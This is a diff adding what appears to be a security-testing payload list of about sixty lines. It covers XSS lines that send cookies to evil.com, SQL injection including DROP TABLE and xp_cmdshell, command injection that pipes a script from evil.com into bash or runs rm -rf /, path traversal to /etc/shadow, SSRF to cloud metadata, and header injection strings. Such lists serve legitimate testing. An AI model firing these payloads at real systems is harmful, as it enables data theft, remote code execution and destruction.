@@ -1,0 +1,58 @@
+<script>fetch('http://evil.com/cookie')</script>
+"><script>fetch('http://evil.com/cookie')</script>
+<script src=http://collaborator/xss.js></script>
+"><img src=x onerror=fetch('http://evil.com/cookie')>
+"><svg/onload=fetch('http://evil.com/cookie')>
+"><iframe src=javascript:fetch('http://evil.com/cookie')>
+"><svg/onload=fetch('http://evil.com/cookie')>
+' OR 1=1--
+' OR '1'='1
+' OR 1=1; DROP TABLE users;--
+' UNION SELECT NULL,NULL,NULL;--
+" OR "1"="1
+'; EXEC xp_cmdshell('ping evil.com');--
+$(id)
+; ls -la;
+| whoami
+`cat /etc/passwd`
+; rm -rf /
+| curl http://evil.com/malicious.sh | bash
+; $(curl http://evil.com/shell.sh)
+; echo $(whoami)
+../../../../etc/passwd
+../../../../var/log/auth.log
+../../../../../windows/system32/drivers/etc/hosts
+../../../boot.ini
+../../../../../../../etc/shadow
+C:/windows/system32/cmd.exe
+/../../../../../../proc/self/environ
+%00/etc/passwd
+http://localhost:80
+http://127.0.0.1:80
+http://internalservice.local/admin
+http://169.254.169.254/latest/meta-data/
+http://127.0.0.1:8080/?q=malicious_payload
+http://evil.com/steal?data=
+file:///etc/passwd
+gopher://localhost:3306
+\r\n
+%0d%0aHeader-Injected: MaliciousValue
+%0d%0aContent-Length: 0%0d%0a%0d%0aInjectedHeader: Value
+%0d%0aHTTP/1.1 200 OK%0d%0a
+\nInjected-Header: true\n
+%0d%0aSet-Cookie: session=evil; HttpOnly
+%00
+test%00
+evil%00string
+%u202E
+%C0%AF
+%C0%AE%C0%AE%C0%AF
+%2F%2E%2E%2F
+';-- \
+"';-- \
+"'><img src=x onerror=alert(1)>
+{{7*7}}
+<%= 7*7 %>
+\"><svg onload=alert('XSS')>
+!@#$%^&*()_+-=
+<>&"'
